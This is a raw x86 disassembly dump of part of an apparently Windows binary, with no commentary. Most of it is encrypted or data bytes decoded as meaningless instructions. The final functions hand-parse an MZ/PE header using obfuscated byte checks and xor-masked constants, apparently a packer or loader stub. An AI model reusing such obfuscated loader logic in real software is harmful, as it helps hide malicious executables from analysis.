  40c543:	scas   al,BYTE PTR es:[edi]
  40c544:	push   0xffffffa5
  40c546:	push   ebx
  40c547:	in     eax,dx
  40c548:	sbb    DWORD PTR [esp-0x66],esi
  40c54c:	out    dx,eax
  40c54d:	test   DWORD PTR [eax],ebx
  40c54f:	fldcw  WORD PTR [esi]
  40c551:	stos   BYTE PTR es:[edi],al
  40c552:	fcmovnb st,st(6)
  40c554:	js     0x40c5a3
  40c556:	cld    
  40c557:	cmp    DWORD PTR [ecx],0x43ad9c0f
  40c55d:	call   DWORD PTR [edx]
  40c55f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40c560:	scas   al,BYTE PTR es:[edi]
  40c561:	cmc    
  40c562:	xor    edi,DWORD PTR [edi-0x48]
  40c565:	js     0x40c5b6
  40c567:	(bad)  
  40c568:	xor    ecx,edi
  40c56a:	mov    dl,0xd7
  40c56c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40c56d:	fcmovb st,st(7)
  40c56f:	add    DWORD PTR [edi],edi
  40c571:	stos   DWORD PTR es:[edi],eax
  40c572:	push   edi
  40c573:	jge    0x40c5b3
  40c575:	jbe    0x40c577
  40c577:	mov    ds:0x8eb7d136,eax
  40c57c:	mov    al,ds:0x8e065442
  40c581:	cmp    edi,DWORD PTR [eax-0x22ccc0ea]
  40c587:	jg     0x40c573
  40c589:	mov    eax,ds:0x8358e70
  40c58e:	push   ecx
  40c58f:	push   esp
  40c590:	push   ecx
  40c591:	push   ds
  40c592:	ret    0xfe61
  40c595:	jg     0x40c546
  40c597:	xor    al,0xf4
  40c599:	leave  
  40c59a:	rol    DWORD PTR [esi+0x2d],cl
  40c59d:	fidiv  WORD PTR [esi+0x7e]
  40c5a0:	mov    bh,0xc7
  40c5a2:	lahf   
  40c5a3:	inc    eax
  40c5a4:	adc    BYTE PTR [edx],bl
  40c5a6:	(bad)  
  40c5a7:	cmp    edi,DWORD PTR [esi+0x2c009be9]
  40c5ad:	arpl   si,cx
  40c5af:	pushf  
  40c5b0:	and    bh,BYTE PTR [edx-0x59]
  40c5b3:	in     eax,0x82
  40c5b5:	(bad)  
  40c5b6:	cmc    
  40c5b7:	push   eax
  40c5b8:	push   esi
  40c5b9:	cwde   
  40c5ba:	out    dx,eax
  40c5bb:	(bad)  
  40c5bc:	(bad)  
  40c5bd:	cmp    DWORD PTR [edx+0x2b],esi
  40c5c0:	(bad)  
  40c5c1:	push   edx
  40c5c2:	jbe    0x40c638
  40c5c4:	out    dx,eax
  40c5c5:	add    BYTE PTR [esp+eiz*8-0x5c2fcf76],dh
  40c5cc:	push   eax
  40c5cd:	adc    DWORD PTR [ecx],ebx
  40c5cf:	xchg   ecx,eax
  40c5d0:	repnz push ebx
  40c5d2:	std    
  40c5d3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40c5d4:	js     0x40c598
  40c5d6:	cmp    DWORD PTR [eax],edx
  40c5d8:	adc    al,0x6b
  40c5da:	sar    BYTE PTR ss:[ebx],0x94
  40c5de:	xor    BYTE PTR [ecx-0x7747c895],dh
  40c5e4:	rcr    dl,1
  40c5e6:	pop    ecx
  40c5e7:	test   DWORD PTR [ebp+0x22b4e6d2],ebp
  40c5ed:	or     DWORD PTR [eax+0x0],edi
  40c5f0:	mov    ebx,0xd7a9360c
  40c5f5:	xor    eax,0x1aef4c70
  40c5fa:	or     DWORD PTR [ecx],eax
  40c5fc:	or     eax,0x7aba684e
  40c601:	ret    
  40c602:	fdivr  QWORD PTR [ecx]
  40c604:	(bad)  
  40c605:	arpl   sp,bp
  40c607:	lods   eax,DWORD PTR ds:[esi]
  40c608:	mov    ?,esi
  40c60a:	popf   
  40c60b:	sbb    al,0x56
  40c60d:	into   
  40c60e:	cmc    
  40c60f:	sub    DWORD PTR [esi+0x66],edi
  40c612:	aaa    
  40c613:	mov    ch,0x19
  40c615:	fmul   DWORD PTR [edi+0x2682b1f0]
  40c61b:	ror    BYTE PTR [ecx+ebp*8+0x6dd6c955],cl
  40c622:	dec    edi
  40c623:	in     al,0x6c
  40c625:	xchg   esp,eax
  40c626:	dec    edi
  40c627:	and    al,0x9c
  40c629:	inc    esi
  40c62a:	xchg   BYTE PTR [edi+0x3fc39ee6],dh
  40c630:	stos   DWORD PTR es:[edi],eax
  40c631:	ror    BYTE PTR [esi+0x7aae9f39],1
  40c637:	stos   DWORD PTR es:[edi],eax
  40c638:	push   ebx
  40c639:	jae    0x40c68c
  40c63b:	cmp    BYTE PTR ss:[ebx-0x2a9d742],dl
  40c642:	mov    ch,0xaa
  40c644:	fst    QWORD PTR [ebp-0x47]
  40c647:	xchg   BYTE PTR [eax-0x31],dh
  40c64a:	xor    BYTE PTR ds:0x77938bab,ch
  40c650:	ja     0x40c689
  40c652:	lds    ebp,FWORD PTR [eax]
  40c654:	test   eax,0xba39984d
  40c659:	mov    al,ds:0xb34399d4
  40c65e:	sub    BYTE PTR [edx],0xc9
  40c661:	fadd   QWORD PTR [ecx+ebp*1-0x5a]
  40c665:	and    edi,DWORD PTR [ebp+edx*2-0x6a2a272a]
  40c66c:	fsubp  st(0),st
  40c66e:	int3   
  40c66f:	pusha  
  40c670:	fwait
  40c671:	jo     0x40c616
  40c673:	pop    ebp
  40c674:	mov    esp,0x24af4d7f
  40c679:	xchg   bh,dl
  40c67b:	popa   
  40c67c:	lea    ebp,[eax+0x37]
  40c67f:	dec    edx
  40c680:	dec    eax
  40c681:	jmp    0x45be:0x8907f8b4
  40c688:	loop   0x40c669
  40c68a:	xchg   esi,eax
  40c68b:	int    0x78
  40c68d:	lods   eax,DWORD PTR ds:[esi]
  40c68e:	in     al,dx
  40c68f:	and    ebx,esi
  40c691:	adc    sp,WORD PTR [bx+si+0x62]
  40c696:	aas    
  40c697:	iret   
  40c698:	dec    ebx
  40c699:	iret   
  40c69a:	inc    esi
  40c69b:	(bad)  
  40c69d:	push   ecx
  40c69e:	push   edx
  40c69f:	xchg   esi,eax
  40c6a0:	sub    bh,ch
  40c6a2:	cld    
  40c6a3:	call   0xae31:0xe2f214a4
  40c6aa:	jmp    0x64f89a67
  40c6af:	mov    eax,0x39daebe3
  40c6b4:	or     DWORD PTR [esi-0x2c360d9a],edi
  40c6ba:	test   DWORD PTR [eax],esi
  40c6bc:	pop    ebx
  40c6bd:	adc    dl,BYTE PTR [edx+0x7d]
  40c6c0:	cmp    edi,DWORD PTR ds:0xc7d6dc2c
  40c6c6:	fsubr  st,st(1)
  40c6c8:	jns    0x40c6fe
  40c6ca:	adc    eax,DWORD PTR [eax+0x56]
  40c6cd:	mov    bl,0x82
  40c6cf:	ret    0x58e0
  40c6d2:	jg     0x40c706
  40c6d4:	xlat   BYTE PTR ds:[ebx]
  40c6d5:	bound  esi,QWORD PTR [eax]
  40c6d7:	leave  
  40c6d8:	dec    edx
  40c6d9:	dec    edx
  40c6da:	adc    al,0xd5
  40c6dc:	push   0x1735c44e
  40c6e1:	jns    0x40c741
  40c6e3:	dec    edx
  40c6e4:	adc    eax,ebp
  40c6e6:	rcr    ebp,1
  40c6e8:	jl     0x40c71a
  40c6ea:	and    cl,0xa7
  40c6ed:	xor    ah,BYTE PTR cs:[esi-0x6d77f661]
  40c6f4:	js     0x40c6f9
  40c6f6:	popa   
  40c6f7:	pusha  
  40c6f8:	lahf   
  40c6f9:	repz iret 
  40c6fb:	rcl    bl,1
  40c6fd:	fcomp  DWORD PTR [ebx+0x33]
  40c700:	push   esi
  40c701:	fldcw  WORD PTR [ebx-0x4013270f]
  40c707:	sub    eax,0xc46653fa
  40c70c:	cmp    al,0xbd
  40c70e:	sbb    BYTE PTR [edx-0x42d1cb50],0xd5
  40c715:	(bad)  
  40c717:	leave  
  40c718:	ins    BYTE PTR es:[edi],dx
  40c719:	fisttp WORD PTR [edx-0x6a8d78f4]
  40c71f:	xor    al,0x2d
  40c721:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40c722:	sub    eax,0x31034e9d
  40c727:	sti    
  40c728:	leave  
  40c729:	cmp    edi,edx
  40c72b:	dec    DWORD PTR [ebx+0x323c76bb]
  40c731:	popf   
  40c732:	and    bl,BYTE PTR [ebp+0x13]
  40c735:	xchg   esi,eax
  40c736:	out    0xab,eax
  40c738:	imul   ebp,DWORD PTR [ebx+ebp*1],0x8e1043de
  40c73f:	sub    DWORD PTR [eax+ebp*2+0x8],esi
  40c743:	in     al,0xbc
  40c745:	shr    DWORD PTR [eax],cl
  40c747:	sbb    al,0x15
  40c749:	mov    ecx,0x30da1a91
  40c74e:	ror    DWORD PTR [ecx-0x6c],0x23
  40c752:	leave  
  40c753:	lock (bad) 
  40c755:	out    0x60,eax
  40c757:	or     eax,0xad4eb366
  40c75c:	in     al,0x1b
  40c75e:	jge    0x40c7df
  40c760:	mov    bl,0x74
  40c762:	xor    DWORD PTR [eax],esp
  40c764:	arpl   WORD PTR [ebp+0x6faf5d9a],cx
  40c76a:	mov    edx,0x3fd64232
  40c76f:	pminub mm1,mm7
  40c772:	xchg   edi,eax
  40c773:	nop
  40c774:	jbe    0x40c7cd
  40c776:	sbb    ebp,ebp
  40c778:	ins    BYTE PTR es:[edi],dx
  40c779:	mov    bh,0x7f
  40c77b:	jb     0x40c75d
  40c77d:	out    0x9d,eax
  40c77f:	xchg   ebx,eax
  40c780:	sbb    eax,DWORD PTR [edi]
  40c782:	jbe    0x40c79c
  40c784:	inc    edx
  40c785:	stos   BYTE PTR es:[edi],al
  40c786:	das    
  40c787:	jbe    0x40c778
  40c789:	jne    0x40c749
  40c78b:	sub    ebp,ecx
  40c78d:	arpl   WORD PTR ds:0x1aa32868,di
  40c793:	jae    0x40c757
  40c795:	mov    ebx,DWORD PTR [esi]
  40c797:	or     dl,BYTE PTR [ecx]
  40c799:	lahf   
  40c79a:	test   BYTE PTR [ebp+0x2f],bl
  40c79d:	sub    DWORD PTR [ebp+0x88e6719],esp
  40c7a3:	aam    0xf7
  40c7a5:	pushf  
  40c7a6:	std    
  40c7a7:	lea    eax,[eax+0x36614767]
  40c7ad:	ss outs dx,DWORD PTR ss:[esi]
  40c7b0:	ds fucom st(6)
  40c7b3:	invlpg BYTE PTR [ecx-0x19]
  40c7b7:	std    
  40c7b8:	fstp   QWORD PTR [ecx]
  40c7ba:	test   DWORD PTR [eax+0x4b4f1a69],esi
  40c7c0:	pusha  
  40c7c1:	mov    ch,0x62
  40c7c3:	fwait
  40c7c4:	inc    edi
  40c7c5:	sbb    ecx,edx
  40c7c7:	adc    ecx,esi
  40c7c9:	shl    DWORD PTR [esi+0x38d0b362],cl
  40c7cf:	mov    bl,0x68
  40c7d1:	fwait
  40c7d2:	add    eax,0x8b24579a
  40c7d7:	dec    ebp
  40c7d8:	clc    
  40c7d9:	mov    ecx,DWORD PTR [ecx]
  40c7db:	mov    eax,DWORD PTR [eax+ecx*1]
  40c7de:	mov    DWORD PTR [ebp-0x20],eax
  40c7e1:	mov    eax,DWORD PTR [ebp+0x8]
  40c7e4:	xor    eax,esi
  40c7e6:	add    eax,edi
  40c7e8:	mov    DWORD PTR [ebp-0x24],eax
  40c7eb:	mov    eax,DWORD PTR [ebp+0x8]
  40c7ee:	jmp    0x40cb3b
  40c7f3:	mov    ecx,0xbd47bdf8
  40c7f8:	inc    ebx
  40c7f9:	inc    ecx
  40c7fa:	or     BYTE PTR [eax],0xac
  40c7fd:	data16 (bad) 
  40c7ff:	push   ebx
  40c800:	mov    edx,0x82c934f3
  40c805:	jle    0x40c885
  40c807:	cs jge 0x40c888
  40c80a:	jle    0x40c860
  40c80c:	iret   
  40c80d:	inc    ebx
  40c80e:	loop   0x40c82e
  40c810:	push   edx
  40c811:	in     al,dx
  40c812:	cmp    esp,DWORD PTR [esi-0x64]
  40c815:	adc    al,0x13
  40c817:	and    DWORD PTR [edx],0xcd858b38
  40c81d:	ffreep st(1)
  40c81f:	add    BYTE PTR [ebp-0x6],bl
  40c822:	push   0x325d6f92
  40c827:	jmp    0x9185:0x2e669c84
  40c82e:	test   al,0x93
  40c830:	cmp    al,0xd4
  40c832:	stc    
  40c833:	hlt    
  40c834:	xchg   ebx,eax
  40c835:	jo     0x40c7d4
  40c837:	repz jg 0x40c7ba
  40c83a:	in     eax,0xe4
  40c83c:	imul   esp,DWORD PTR [ecx-0x4e],0xffffff81
  40c840:	add    ebx,esi
  40c842:	pop    ss
  40c843:	cmp    DWORD PTR [esi],edi
  40c845:	idiv   DWORD PTR [ecx+eiz*4+0x1f]
  40c849:	int3   
  40c84a:	mov    ds:0x9500ea40,eax
  40c84f:	pcmpeqd mm6,mm4
  40c852:	addr16 xchg esp,eax
  40c854:	sar    DWORD PTR [edi],1
  40c856:	(bad)  
  40c857:	cmc    
  40c858:	out    0x1d,eax
  40c85a:	push   ebp
  40c85b:	popf   
  40c85c:	jle    0x40c80c
  40c85e:	inc    esi
  40c85f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40c860:	(bad)  [eax]
  40c862:	ds pop esi
  40c864:	pop    esi
  40c865:	cmp    BYTE PTR [ebx],bh
  40c867:	push   esp
  40c868:	lods   al,BYTE PTR ds:[esi]
  40c869:	ins    BYTE PTR es:[edi],dx
  40c86a:	(bad)
  40c86d:	ror    DWORD PTR [ecx+0x48],cl
  40c870:	ret    0x608f
  40c873:	adc    DWORD PTR [edi-0x33],edx
  40c876:	and    ecx,DWORD PTR [edi]
  40c878:	adc    DWORD PTR [ecx+0x26],ecx
  40c87b:	or     eax,0x3afd00ac
  40c880:	mov    ch,0xbf
  40c882:	and    al,0x27
  40c884:	mov    al,0x86
  40c886:	mov    ch,0x64
  40c888:	inc    ebp
  40c889:	outs   dx,BYTE PTR ds:[esi]
  40c88a:	dec    ecx
  40c88b:	stos   DWORD PTR es:[edi],eax
  40c88c:	pop    esi
  40c88d:	dec    edi
  40c88e:	int    0x63
  40c890:	dec    ebx
  40c891:	sar    BYTE PTR [edi+edx*1-0x57],0xce
  40c896:	(bad)  
  40c898:	daa    
  40c899:	or     ecx,DWORD PTR [edx+ebx*4]
  40c89c:	push   eax
  40c89d:	mov    WORD PTR [eax+0x65],es
  40c8a0:	add    al,0x30
  40c8a2:	cmp    eax,0x676c7aa7
  40c8a7:	cmp    BYTE PTR [esi],bh
  40c8a9:	mov    edx,cs
  40c8ab:	sbb    bh,ch
  40c8ad:	dec    ebx
  40c8ae:	cmc    
  40c8af:	ficomp DWORD PTR [esi+0x2d2bb4c0]
  40c8b5:	bound  ebp,QWORD PTR [ebx]
  40c8b7:	out    0x1f,al
  40c8b9:	pop    esp
  40c8ba:	sbb    eax,0x843a5a02
  40c8bf:	loop   0x40c8a4
  40c8c1:	xor    dl,BYTE PTR [eax-0x4d]
  40c8c4:	fistp  QWORD PTR [esi+eax*2+0x53014f3d]
  40c8cb:	xchg   BYTE PTR [edx+eax*2+0x77],ah
  40c8cf:	mov    cl,0x60
  40c8d1:	mov    edi,0x195e9010
  40c8d6:	pop    esp
  40c8d7:	aad    0xa9
  40c8d9:	push   es
  40c8da:	pusha  
  40c8db:	mov    eax,0x72dbae83
  40c8e1:	xchg   BYTE PTR ds:[edi-0x3bff5012],bh
  40c8e8:	ins    BYTE PTR es:[edi],dx
  40c8e9:	popa   
  40c8ea:	sub    edi,DWORD PTR [ebp-0x5d]
  40c8ed:	jae    0x40c91e
  40c8ef:	jb     0x40c8b1
  40c8f1:	xchg   DWORD PTR [edi-0x32],ecx
  40c8f4:	sbb    BYTE PTR [ebx+0x32],0xdb
  40c8f8:	dec    edx
  40c8f9:	adc    al,0xf4
  40c8fb:	jb     0x40c891
  40c8fd:	push   eax
  40c8fe:	fwait
  40c8ff:	jmp    0xe1643edf
  40c904:	mov    dl,0xa9
  40c906:	inc    esp
  40c907:	sbb    edi,DWORD PTR [eax-0x1bfa4c7f]
  40c90d:	and    al,0xb6
  40c90f:	(bad)  
  40c910:	out    dx,eax
  40c911:	fstp   DWORD PTR [ebx]
  40c913:	xor    esi,DWORD PTR ds:[edi]
  40c916:	mov    ebx,0x2d419c7d
  40c91b:	push   es
  40c91c:	mov    DWORD PTR [esi-0x2dcde204],ecx
  40c922:	mov    BYTE PTR [ebx-0x45],ah
  40c925:	retf   
  40c926:	dec    ecx
  40c927:	fdiv   QWORD PTR [eax-0x24d7337b]
  40c92d:	rol    BYTE PTR [ecx-0x6f],0x62
  40c931:	xchg   ebp,eax
  40c932:	test   al,0x8b
  40c934:	cwde   
  40c935:	in     eax,dx
  40c936:	mov    al,BYTE PTR [ecx-0x4a859f81]
  40c93c:	inc    ecx
  40c93d:	(bad)  [ebp+0x4b]
  40c940:	in     eax,dx
  40c941:	xor    al,0x8d
  40c943:	mov    cl,0x9c
  40c945:	(bad)  
  40c946:	adc    edi,DWORD PTR [eax+0x2d]
  40c949:	pextrw esi,(bad),0xc5
  40c94b:	xor    al,0x52
  40c94d:	jbe    0x40c8e8
  40c94f:	mov    cs,WORD PTR [edi-0x33]
  40c952:	(bad)
  40c955:	in     eax,0x57
  40c957:	mov    edi,0xc070375b
  40c95c:	jnp    0x40c965
  40c95e:	outs   dx,DWORD PTR ds:[esi]
  40c95f:	mov    edx,0x18436b99
  40c964:	cs xor eax,0xf58bea15
  40c96a:	in     eax,0x62
  40c96c:	add    al,BYTE PTR [esi+eax*1-0x39]
  40c970:	pop    esp
  40c971:	out    dx,al
  40c972:	jg     0x40c953
  40c974:	sbb    dl,al
  40c976:	and    BYTE PTR [ebx+0x344238b4],ah
  40c97c:	fidiv  WORD PTR [ecx-0x75]
  40c97f:	cmp    al,0xab
  40c981:	idiv   DWORD PTR [eax+0x5f6eb176]
  40c987:	inc    ecx
  40c988:	pop    ss
  40c989:	in     al,0x68
  40c98b:	ins    DWORD PTR es:[edi],dx
  40c98c:	inc    edx
  40c98d:	stos   DWORD PTR es:[edi],eax
  40c98e:	and    ebx,DWORD PTR [esp+esi*2+0x3a]
  40c992:	xchg   ecx,eax
  40c993:	out    0xee,eax
  40c995:	inc    esp
  40c996:	mov    WORD PTR [edx+0x73],cs
  40c999:	leave  
  40c99a:	fidivr DWORD PTR ds:0xbca4d397
  40c9a0:	es pushf 
  40c9a2:	adc    DWORD PTR [edi-0x5c11befd],ebp
  40c9a8:	cmp    eax,0x4c8e7348
  40c9ad:	sbb    DWORD PTR [ecx+ecx*8],edx
  40c9b0:	nop
  40c9b1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40c9b2:	mov    ebp,DWORD PTR [esi+0x13]
  40c9b5:	aaa    
  40c9b6:	fadd   QWORD PTR [ebx+0x11a824e9]
  40c9bc:	daa    
  40c9bd:	adc    edx,DWORD PTR [edi-0x47]
  40c9c0:	cmp    edi,DWORD PTR [edx]
  40c9c2:	icebp  
  40c9c3:	push   0x34eadc01
  40c9c8:	lods   eax,DWORD PTR ds:[esi]
  40c9c9:	nop
  40c9ca:	sbb    DWORD PTR [ebp+0x521cc64a],0x39ed9142
  40c9d4:	(bad)  
  40c9d5:	fcom   QWORD PTR [ecx+0x44124e75]
  40c9db:	cmp    BYTE PTR ds:0xf42facf,0x7a
  40c9e2:	mov    dl,0x25
  40c9e4:	jge    0x40ca03
  40c9e6:	in     al,0xf5
  40c9e8:	lea    esi,[ebx+edi*1]
  40c9eb:	mov    edx,0x138c8286
  40c9f0:	push   es
  40c9f1:	nop
  40c9f2:	ds dec ecx
  40c9f4:	mov    ds:0x6c299625,eax
  40c9f9:	xchg   ebp,eax
  40c9fa:	arpl   WORD PTR ds:0xd546fca6,dx
  40ca00:	lahf   
  40ca01:	dec    BYTE PTR [eax+0x50]
  40ca04:	adc    edi,DWORD PTR [esi-0x44]
  40ca07:	mov    ss,WORD PTR [ecx-0x4e]
  40ca0a:	jnp    0x40c9db
  40ca0c:	cld    
  40ca0d:	mov    esi,0x6be6e138
  40ca12:	ret    0x30b3
  40ca15:	or     al,0xc0
  40ca17:	fwait
  40ca18:	cli    
  40ca19:	out    0xd8,eax
  40ca1b:	cmc    
  40ca1c:	fild   WORD PTR [edi+0x6a2cbd56]
  40ca22:	out    dx,eax
  40ca23:	ret    
  40ca24:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40ca25:	xchg   esp,eax
  40ca26:	ss out 0x99,eax
  40ca29:	push   edx
  40ca2a:	ins    DWORD PTR es:[edi],dx
  40ca2b:	aas    
  40ca2c:	gs icebp 
  40ca2e:	jnp    0x40ca75
  40ca30:	push   ds
  40ca31:	and    al,bh
  40ca33:	jb     0x40ca44
  40ca35:	bound  esp,QWORD PTR [edx]
  40ca37:	push   cs
  40ca38:	icebp  
  40ca39:	push   0x0
  40ca3b:	cmp    al,0x69
  40ca3d:	xor    eax,0x513519e8
  40ca42:	leave  
  40ca43:	push   eax
  40ca44:	mov    cl,0xd
  40ca46:	xor    al,0x7
  40ca48:	xcrypt-cfb (bad)
  40ca49:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40ca4a:	in     al,0x39
  40ca4c:	fbld   TBYTE PTR [edi-0x35]
  40ca4f:	in     eax,dx
  40ca50:	ja     0x40caae
  40ca52:	adc    BYTE PTR [ebx+eiz*2+0x16f4c26b],dh
  40ca59:	in     eax,dx
  40ca5a:	in     al,0xf6
  40ca5c:	adc    eax,0xabcd513c
  40ca61:	push   es
  40ca62:	rol    BYTE PTR [eax-0x12],cl
  40ca65:	push   edi
  40ca66:	adc    al,0x21
  40ca68:	pop    ss
  40ca69:	or     al,0x60
  40ca6b:	sbb    ah,dh
  40ca6d:	(bad)
  40ca70:	mov    ecx,0x414bb3b0
  40ca75:	int    0x87
  40ca77:	jnp    0x40ca3c
  40ca79:	pop    ds
  40ca7a:	sub    eax,0x7ea77912
  40ca7f:	dec    edi
  40ca80:	xchg   edx,eax
  40ca81:	pop    ebp
  40ca82:	xor    al,0x38
  40ca84:	mov    ds:0x2bf07bab,al
  40ca89:	xor    DWORD PTR [edx-0x14],eax
  40ca8c:	sbb    al,0x16
  40ca8e:	mov    ebx,0x828e5f78
  40ca93:	sbb    eax,0xf1975667
  40ca98:	jecxz  0x40ca68
  40ca9a:	dec    esi
  40ca9b:	adc    BYTE PTR [ebp-0x1c],cl
  40ca9e:	fsubr  QWORD PTR [ebp+esi*8+0x3391d576]
  40caa5:	dec    esp
  40caa6:	mov    eax,0x5a1c94dd
  40caab:	xor    dl,ch
  40caad:	adc    ebx,DWORD PTR [edx+ebp*4]
  40cab0:	test   eax,0xc7ef376f
  40cab5:	das    
  40cab6:	ret    0x90c9
  40cab9:	add    al,0x57
  40cabb:	cwde   
  40cabc:	test   al,0xff
  40cabe:	jo     0x40cada
  40cac0:	popa   
  40cac1:	mov    al,0xad
  40cac3:	jb     0x40cadd
  40cac5:	enter  0x587c,0x41
  40cac9:	mul    DWORD PTR [ebx]
  40cacb:	jge    0x40cb24
  40cacd:	push   ecx
  40cace:	jbe    0x40cb08
  40cad0:	jae    0x40cb45
  40cad2:	fimul  DWORD PTR [edx-0x4669738f]
  40cad8:	mov    ds:0xe9e620fd,eax
  40cadd:	clc    
  40cade:	neg    BYTE PTR [edx]
  40cae0:	gs mov ah,0x23
  40cae3:	xor    DWORD PTR [ebx+0xd67e80c],esi
  40cae9:	xor    eax,0x50a7c751
  40caee:	(bad)  
  40caef:	sbb    BYTE PTR [eax-0xf],dl
  40caf2:	mov    ebp,0x86607622
  40caf7:	test   eax,0x213eff49
  40cafc:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40cafd:	nop
  40cafe:	mov    eax,ds:0xad2b7b69
  40cb03:	sbb    ebp,DWORD PTR [edx-0x7dc66e48]
  40cb09:	ss mov dl,bl
  40cb0c:	push   eax
  40cb0d:	mov    edx,0x75d8be12
  40cb12:	sub    edx,DWORD PTR [edi+edx*1+0x50]
  40cb16:	mov    edx,0xa3cb5d51
  40cb1b:	sub    eax,0x8e312808
  40cb20:	outs   dx,DWORD PTR ds:[esi]
  40cb21:	idiv   BYTE PTR [ebp+0x42]
  40cb24:	jo     0x40caba
  40cb26:	mov    al,ds:0xb4cf175d
  40cb2b:	shr    DWORD PTR [esi+0x37616301],cl
  40cb31:	mov    ah,0x4d
  40cb33:	in     al,dx
  40cb34:	out    dx,eax
  40cb35:	and    esp,DWORD PTR [eax+0x78]
  40cb38:	sub    dh,bl
  40cb3a:	int3   
  40cb3b:	mov    ecx,DWORD PTR [ebp-0x20]
  40cb3e:	xor    eax,esi
  40cb40:	add    eax,edi
  40cb42:	cmp    ecx,eax
  40cb44:	je     0x40cba4
  40cb4a:	mov    eax,DWORD PTR [ebp-0x8]
  40cb4d:	mov    ecx,DWORD PTR [ebp-0x20]
  40cb50:	add    ecx,DWORD PTR [eax]
  40cb52:	mov    DWORD PTR [ebp-0x24],ecx
  40cb55:	mov    eax,DWORD PTR [ebp-0x24]
  40cb58:	mov    ecx,DWORD PTR [ebp-0x8]
  40cb5b:	mov    eax,DWORD PTR [eax+0xc]
  40cb5e:	mov    ecx,DWORD PTR [ecx]
  40cb60:	mov    al,BYTE PTR [eax+ecx*1]
  40cb63:	add    al,0x38
  40cb65:	xor    al,0x46
  40cb67:	cmp    al,0xc5
  40cb69:	je     0x40cb80
  40cb6f:	mov    eax,DWORD PTR [ebp+0x8]
  40cb72:	mov    ecx,DWORD PTR [ebp-0x8]
  40cb75:	xor    eax,esi
  40cb77:	add    eax,edi
  40cb79:	mov    DWORD PTR [ecx],eax
  40cb7b:	jmp    0x40cba4
  40cb80:	xor    DWORD PTR [ebp-0xc],0x5fd8f
  40cb87:	jmp    0x40cba4
  40cb8c:	mov    eax,DWORD PTR [ebp-0x8]
  40cb8f:	mov    ecx,DWORD PTR [ebp-0x1c]
  40cb92:	mov    ecx,DWORD PTR [ecx]
  40cb94:	mov    DWORD PTR [eax],ecx
  40cb96:	mov    eax,DWORD PTR [ebp+0xc]
  40cb99:	mov    eax,DWORD PTR [ebp+0x8]
  40cb9c:	push   DWORD PTR [ebp-0x8]
  40cb9f:	call   0x401000
  40cba4:	mov    eax,DWORD PTR [ebp-0xc]
  40cba7:	cmp    eax,ebx
  40cba9:	je     0x40b333
  40cbaf:	mov    eax,DWORD PTR [ebp-0x8]
  40cbb2:	mov    eax,DWORD PTR [eax]
  40cbb4:	pop    edi
  40cbb5:	pop    esi
  40cbb6:	pop    ebx
  40cbb7:	leave  
  40cbb8:	ret    0x8
  40cbbb:	push   ebp
  40cbbc:	mov    ebp,esp
  40cbbe:	push   ecx
  40cbbf:	mov    DWORD PTR [ebp-0x4],0xf89c8531
  40cbc6:	and    DWORD PTR ds:0x4302d5,0x0
  40cbd0:	jmp    0x40cbe0
  40cbd5:	mov    eax,ds:0x4302d5
  40cbda:	inc    eax
  40cbdb:	mov    ds:0x4302d5,eax
  40cbe0:	cmp    DWORD PTR ds:0x4302d5,0x1f
  40cbe7:	jae    0x40cc78
  40cbed:	cmp    DWORD PTR ds:0x4302d5,0x10
  40cbf4:	jne    0x40cc05
  40cbfa:	push   0x2023
  40cbff:	call   DWORD PTR ds:0x42e88b
  40cc05:	cmp    DWORD PTR ds:0x4302d5,0xf
  40cc0c:	jne    0x40cc20
  40cc12:	xor    eax,eax
  40cc14:	xor    eax,DWORD PTR ds:0x4302d5
  40cc1a:	inc    eax
  40cc1b:	mov    ds:0x4302d5,eax
  40cc20:	jmp    0x40cbd5
  40cc25:	and    DWORD PTR ds:0x4302bd,0x0
  40cc2f:	mov    eax,ds:0x4302bd
  40cc34:	inc    eax
  40cc35:	mov    ds:0x4302bd,eax
  40cc3a:	cmp    DWORD PTR ds:0x4302bd,0x29
  40cc41:	jne    0x40cc6b
  40cc47:	push   DWORD PTR [ebp-0x18]
  40cc4a:	push   DWORD PTR [ebp-0x10]
  40cc4d:	push   0x42e797
  40cc52:	push   0x5c7c
  40cc57:	push   0x209d
  40cc5c:	push   DWORD PTR [ebp-0x1c]
  40cc5f:	push   DWORD PTR [ebp-0x18]
  40cc62:	push   DWORD PTR [ebp-0x24]
  40cc65:	call   DWORD PTR ds:0x42e94b
  40cc6b:	cmp    DWORD PTR ds:0x4302bd,0x1e
  40cc72:	jb     0x40cc2f
  40cc78:	mov    eax,DWORD PTR [ebp+0x8]
  40cc7b:	mov    al,BYTE PTR [eax]
  40cc7d:	add    al,0x38
  40cc7f:	xor    al,0x46
  40cc81:	cmp    al,0xc3
  40cc83:	jne    0x40ccc8
  40cc89:	mov    eax,DWORD PTR [ebp+0x8]
  40cc8c:	mov    ecx,DWORD PTR [ebp+0x8]
  40cc8f:	add    ecx,DWORD PTR [eax+0x3c]
  40cc92:	mov    edx,0x7510854
  40cc97:	mov    DWORD PTR [ebp+0x8],ecx
  40cc9a:	mov    eax,DWORD PTR [ebp-0x4]
  40cc9d:	xor    eax,edx
  40cc9f:	push   esi
  40cca0:	mov    esi,DWORD PTR [ebp+0x8]
  40cca3:	mov    ecx,0x32729b
  40cca8:	add    eax,ecx
  40ccaa:	cmp    DWORD PTR [esi+0x54],eax
  40ccad:	pop    esi
  40ccae:	je     0x40ccbc
  40ccb4:	mov    eax,DWORD PTR [ebp+0x8]
  40ccb7:	jmp    0x40ccd5
  40ccbc:	mov    eax,DWORD PTR [ebp-0x4]
  40ccbf:	xor    eax,edx
  40ccc1:	add    eax,ecx
  40ccc3:	jmp    0x40ccd5
  40ccc8:	mov    eax,DWORD PTR [ebp-0x4]
  40cccb:	xor    eax,0x7510854
  40ccd0:	add    eax,0x32729b
  40ccd5:	leave  
  40ccd6:	ret    0x4
  40ccd9:	push   ebp
  40ccda:	mov    ebp,esp
  40ccdc:	mov    eax,ds:0x41222c
  40cce1:	mov    edx,0x32729b
  40cce6:	sub    eax,edx
  40cce8:	mov    ecx,0x7510854
  40cced:	push   esi
  40ccee:	inc    esi
